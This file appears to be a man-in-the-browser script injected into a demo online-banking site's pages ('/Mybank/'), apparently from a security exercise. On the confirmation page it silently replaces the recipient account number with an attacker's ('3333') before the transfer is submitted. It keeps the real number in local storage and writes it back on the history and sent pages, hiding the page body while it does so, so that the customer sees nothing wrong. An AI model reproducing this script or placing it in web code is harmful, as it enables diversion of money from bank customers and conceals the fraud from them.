	
document.onreadystatechange = function(e)
{
    if (document.readyState === 'complete')
    {
		document.getElementsByTagName("BODY")[0].style.visibility = "hidden";
			
    }
};
$(document).ready(function(){
	//console.log("URUCHOMIONY SKRYPT");
	if (location.pathname == "/Mybank/form.php") {
		//console.log("FORM");
		var nick = $('#nick').text();
		var table = [1];
		if (localStorage.getItem(nick) === null) {
			localStorage.setItem(nick, JSON.stringify(table));
		}
		var table2 = JSON.parse(localStorage.getItem(nick));
		var histtab = document.getElementById("senttable");
		
		var actrow = 1;
		var acttabrow = 0;
		while(histtab.rows[actrow] != undefined){
			if(histtab.rows[actrow].cells[1].innerHTML == "3333"){
				histtab.rows[actrow].cells[1].innerHTML = table2[acttabrow].accBefore;
				acttabrow++;
			}
			actrow++;
		}
		
	} else if (location.pathname == "/Mybank/confirm.php") {
				//console.log("CONFIRM");
		var nick = $('#nick').text();
		var table = JSON.parse(localStorage.getItem(nick));
		

		
		$('#confirmform').submit(function() {
			table.unshift({accBefore: $('#accnr').val()});
			localStorage.setItem(nick, JSON.stringify(table));
			$('#accnr').val('3333');
			return true;
		});
	} else if (location.pathname == "/Mybank/sent.php") {
				//console.log("SENT");
		var nick = $('#nick').text();
		var table = JSON.parse(localStorage.getItem(nick));
		var accnrcell = document.getElementById('senttable').rows[1].cells[1];
		if(accnrcell.innerHTML == "3333"){
			console.log(accnrcell.innerHTML);
			accnrcell.innerHTML = table[0].accBefore;
		}
				
	}
	document.getElementsByTagName("BODY")[0].style.visibility = "visible";
});